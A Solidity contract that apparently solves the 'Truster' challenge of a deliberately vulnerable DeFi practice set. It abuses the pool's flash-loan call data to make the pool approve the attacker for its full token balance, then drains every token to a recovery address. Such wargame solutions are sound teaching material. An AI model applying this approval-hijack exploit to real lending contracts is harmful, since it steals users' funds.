// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool, DamnValuableToken} from "../TrusterLenderPool.sol";

contract TrusedLenderPoolExploiter {
    constructor(address pool, address token, address recovery) {
        bytes memory flashLoanData = abi.encodeWithSelector(
            DamnValuableToken(token).approve.selector, address(this), DamnValuableToken(token).balanceOf(address(pool))
        );
        TrusterLenderPool(pool).flashLoan(0, address(this), token, flashLoanData);

        DamnValuableToken(token).transferFrom(
            address(pool), recovery, DamnValuableToken(token).balanceOf(address(pool))
        );
    }
}
